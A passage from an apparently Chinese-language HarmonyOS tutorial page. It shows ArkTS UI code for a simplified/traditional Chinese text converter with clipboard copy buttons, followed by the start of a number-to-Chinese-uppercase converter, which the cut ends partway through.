class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 导入必要的转换库，提供简体与繁体之间的转换功能</span></span><br><span class="line"><span class="keyword">import</span> &#123; transverter, <span class="title class_">TransverterType</span>, <span class="title class_">TransverterLanguage</span> &#125; <span class="keyword">from</span> <span class="string">&quot;@nutpi/chinese_transverter&quot;</span>;</span><br><span class="line"><span class="comment">// 导入剪贴板服务，用于将文本复制到系统剪贴板</span></span><br><span class="line"><span class="keyword">import</span> &#123; pasteboard &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>;</span><br><span class="line"><span class="comment">// 导入提示服务，用于向用户显示消息</span></span><br><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 使用@Entry装饰器标记此组件为应用的入口点</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">  <span class="comment">// 使用@Component装饰器定义一个名为SimplifiedTraditionalConverter的组件</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">SimplifiedTraditionalConverter</span> &#123;</span><br><span class="line">  <span class="comment">// 定义状态变量inputText，存储用户输入的原始文本，当其值变化时触发onInputTextChanged方法</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;onInputTextChanged&#x27;</span>) <span class="attr">inputText</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// 定义状态变量simplifiedResult，存储转换后的简体结果</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">simplifiedResult</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// 定义状态变量traditionalResult，存储转换后的繁体结果</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">traditionalResult</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// 定义状态变量isInputFocused，表示输入框是否获得了焦点</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isInputFocused</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// 定义主题颜色</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">themeColor</span>: string = <span class="string">&#x27;#439fff&#x27;</span>;</span><br><span class="line">  <span class="comment">// 定义文本颜色</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">textColor</span>: string = <span class="string">&quot;#2e2e2e&quot;</span>;</span><br><span class="line">  <span class="comment">// 定义基础内边距大小</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">basePadding</span>: number = <span class="number">30</span>;</span><br><span class="line">  <span class="comment">// 定义最小文本区域高度</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">minTextAreaHeight</span>: number = <span class="number">50</span>;</span><br><span class="line">  <span class="comment">// 定义最大文本区域高度</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">maxTextAreaHeight</span>: number = <span class="number">300</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 当inputText状态改变时触发的方法，用于更新转换结果</span></span><br><span class="line">  <span class="title function_">onInputTextChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 将inputText转换为简体，并更新simplifiedResult</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">simplifiedResult</span> = <span class="title function_">transverter</span>(&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">TransverterType</span>.<span class="property">SIMPLIFIED</span>,</span><br><span class="line">      <span class="attr">str</span>: <span class="variable language_">this</span>.<span class="property">inputText</span>,</span><br><span class="line">      <span class="attr">language</span>: <span class="title class_">TransverterLanguage</span>.<span class="property">ZH_CN</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 将inputText转换为繁体，并更新traditionalResult</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">traditionalResult</span> = <span class="title function_">transverter</span>(&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">TransverterType</span>.<span class="property">TRADITIONAL</span>,</span><br><span class="line">      <span class="attr">str</span>: <span class="variable language_">this</span>.<span class="property">inputText</span>,</span><br><span class="line">      <span class="attr">language</span>: <span class="title class_">TransverterLanguage</span>.<span class="property">ZH_CN</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 将给定的文本复制到剪贴板，并显示提示信息</span></span><br><span class="line">  private <span class="title function_">copyToClipboard</span>(<span class="attr">text</span>: string): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> clipboardData = pasteboard.<span class="title function_">createData</span>(pasteboard.<span class="property">MIMETYPE_TEXT_PLAIN</span>, text); <span class="comment">// 创建剪贴板数据</span></span><br><span class="line">    <span class="keyword">const</span> systemClipboard = pasteboard.<span class="title function_">getSystemPasteboard</span>(); <span class="comment">// 获取系统剪贴板</span></span><br><span class="line">    systemClipboard.<span class="title function_">setData</span>(clipboardData); <span class="comment">// 设置剪贴板数据</span></span><br><span class="line">    promptAction.<span class="title function_">showToast</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;已复制到剪贴板&#x27;</span> &#125;); <span class="comment">// 显示复制成功的提示</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建组件的UI</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Scroll</span>() &#123; <span class="comment">// 创建可滚动的容器</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123; <span class="comment">// 在滚动容器中创建垂直布局</span></span><br><span class="line">        <span class="comment">// 创建标题文本</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&quot;简体繁体转换器&quot;</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">54</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 创建用户输入区域</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="comment">// 创建多行文本输入框</span></span><br><span class="line">          <span class="title class_">TextArea</span>(&#123; <span class="attr">text</span>: $$this.<span class="property">inputText</span>, <span class="attr">placeholder</span>: <span class="string">&#x27;请输入简体/繁体字（支持混合输入）&#x27;</span> &#125;)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">placeholderColor</span>(<span class="variable language_">this</span>.<span class="property">isInputFocused</span> ? <span class="variable language_">this</span>.<span class="property">themeColor</span> : <span class="title class_">Color</span>.<span class="property">Gray</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">isInputFocused</span> ? <span class="variable language_">this</span>.<span class="property">themeColor</span> : <span class="variable language_">this</span>.<span class="property">textColor</span>)</span><br><span class="line">            .<span class="title function_">borderColor</span>(<span class="variable language_">this</span>.<span class="property">isInputFocused</span> ? <span class="variable language_">this</span>.<span class="property">themeColor</span> : <span class="title class_">Color</span>.<span class="property">Gray</span>)</span><br><span class="line">            .<span class="title function_">caretColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">onBlur</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">isInputFocused</span> = <span class="literal">false</span>) <span class="comment">// 当输入框失去焦点时，更新isInputFocused状态</span></span><br><span class="line">            .<span class="title function_">onFocus</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">isInputFocused</span> = <span class="literal">true</span>) <span class="comment">// 当输入框获得焦点时，更新isInputFocused状态</span></span><br><span class="line">            .<span class="title function_">borderWidth</span>(<span class="number">1</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="variable language_">this</span>.<span class="property">minTextAreaHeight</span>, <span class="attr">maxHeight</span>: <span class="variable language_">this</span>.<span class="property">maxTextAreaHeight</span> &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 创建清空按钮</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;清空&#x27;</span>)</span><br><span class="line">            .<span class="title function_">borderWidth</span>(<span class="number">1</span>)</span><br><span class="line">            .<span class="title function_">borderColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="number">50</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.basePadding * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">            .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// 添加点击效果</span></span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">inputText</span> = <span class="string">&quot;&quot;</span>); <span class="comment">// 清空输入框</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">        .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">        .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 创建繁体结果展示与复制区域</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="comment">// 创建繁体结果标题</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`繁体结果：`</span>)</span><br><span class="line">            .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 创建繁体结果展示文本</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.traditionalResult&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="variable language_">this</span>.<span class="property">minTextAreaHeight</span>, <span class="attr">maxHeight</span>: <span class="variable language_">this</span>.<span class="property">maxTextAreaHeight</span> &#125;)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Start</span>)</span><br><span class="line">            .<span class="title function_">copyOption</span>(<span class="title class_">CopyOptions</span>.<span class="property">InApp</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">3</span>&#125;</span>lpx`</span> &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 创建复制繁体结果按钮</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;复制&#x27;</span>)</span><br><span class="line">            .<span class="title function_">enabled</span>(<span class="variable language_">this</span>.<span class="property">traditionalResult</span> ? <span class="literal">true</span> : <span class="literal">false</span>) <span class="comment">// 只有当有繁体结果时，按钮才可用</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="number">50</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.basePadding * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">            .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">traditionalResult</span>)); <span class="comment">// 复制繁体结果到剪贴板</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">        .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">        .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 创建简体结果展示与复制区域</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="comment">// 创建简体结果标题</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`简体结果：`</span>)</span><br><span class="line">            .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 创建简体结果展示文本</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.simplifiedResult&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="variable language_">this</span>.<span class="property">minTextAreaHeight</span>, <span class="attr">maxHeight</span>: <span class="variable language_">this</span>.<span class="property">maxTextAreaHeight</span> &#125;)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Start</span>)</span><br><span class="line">            .<span class="title function_">copyOption</span>(<span class="title class_">CopyOptions</span>.<span class="property">InApp</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">3</span>&#125;</span>lpx`</span> &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 创建复制简体结果按钮</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;复制&#x27;</span>)</span><br><span class="line">            .<span class="title function_">enabled</span>(<span class="variable language_">this</span>.<span class="property">simplifiedResult</span> ? <span class="literal">true</span> : <span class="literal">false</span>) <span class="comment">// 只有当有简体结果时，按钮才可用</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="number">50</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.basePadding * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">            .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">simplifiedResult</span>)); <span class="comment">// 复制简体结果到剪贴板</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">        .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">        .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f2f3f5&quot;</span>)</span><br><span class="line">    .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>)</span><br><span class="line">    .<span class="title function_">padding</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Up-Lower"><a href="#Up-Lower" class="headerlink" title="Up Lower"></a>Up Lower</h1><p>数字转中文大小写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ohpm install @nutpi/chinese-finance-number</span><br><span class="line">ohpm install @nutpi/chinese-number-format</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入必要的模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// 用于显示提示信息</span></span><br><span class="line"><span class="keyword">import</span> &#123; pasteboard &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>; <span class="comment">// 用于处理剪贴板操作</span></span><br><span class="line"><span class="keyword">import</span> &#123; toChineseNumber &#125; <span class="keyword">from</span> <span class="string">&#x27;@nutpi/chinese-finance-number&#x27;</span>; <span class="comment">// 将数字转换为中文大写金额</span></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  toChineseWithUnits, <span class="comment">// 将数字转换为带单位的中文</span></span><br><span class="line">  toUpperCase, <span class="comment">// 将中文小写转换为大写</span></span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nutpi/chinese-number-format&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span> <span class="comment">// 标记此组件为入口点</span></span><br><span class="line">@<span class="title class_">Component</span> <span class="comment">// 定义一个组件</span></span><br><span class="line">struct <span class="title class_">NumberToChineseConverter</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">exampleNumber</span>: number = <span class="number">88.8</span>; <span class="comment">// 示例数字</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">textColor</span>: string = <span class="string">&quot;#2e2e2e&quot;</span>; <span class="comment">// 文本颜色</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">lineColor</span>: string = <span class="string">&quot;#d5d5d5&quot;</span>; <span class="comment">// 分割线颜色</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">basePadding</span>: number = <span class="number">30</span>; <span class="comment">// 基础内边距</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">chineseLowercase</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// 转换后的小写中文</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">chineseUppercase</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// 转换后的中文大写</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">chineseUppercaseAmount</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// 转换后的中文大写金额</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;inputChanged&#x27;</span>) private <span class="attr">inputText</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// 监听输入文本变化</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 当输入文本改变时触发的方法</span></span><br><span class="line">  <span class="title function_">inputChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chineseLowercase</span> = <span class="title function_">toChineseWithUnits</span>(<span class="title class_">Number</span>(<span class="variable language_">this</span>.<span class="property">inputText</span>), <span class="string">&#x27;zh-CN&#x27;</span>); <span class="comment">// 转换为小写中文并带上单位</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chineseUppercase</span> = <span class="title function_">toUpperCase</span>(<span class="variable language_">this</span>.<span class="property">chineseLowercase</span>, <span class="string">&#x27;zh-CN&#x27;</span>); <span class="comment">// 将小写中文转换为大写</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chineseUppercaseAmount</span> = <span class="title function_">toChineseNumber</span>(<span class="title class_">Number</span>(<span class="variable language_">this</span>.<span class="property">inputText</span>)); <span class="comment">// 转换为大写金额</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 复制文本到剪贴板的方法</span></span><br><span class="line">  private <span class="title function_">copyToClipboard</span>(<span class="attr">text</span>: string): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> pasteboardData = pasteboard.<span class="title function_">createData</span>(pasteboard.<span class="property">MIMETYPE_TEXT_PLAIN</span>, text); <span class="comment">// 创建剪贴板数据</span></span><br><span class="line">    <span class="keyword">const</span> systemPasteboard = pasteboard.<span class="title function_">getSystemPasteboard</span>(); <span class="comment">// 获取系统剪贴板</span></span><br><span class="line">    systemPasteboard.<span class="title function_">setData</span>(pasteboardData); <span 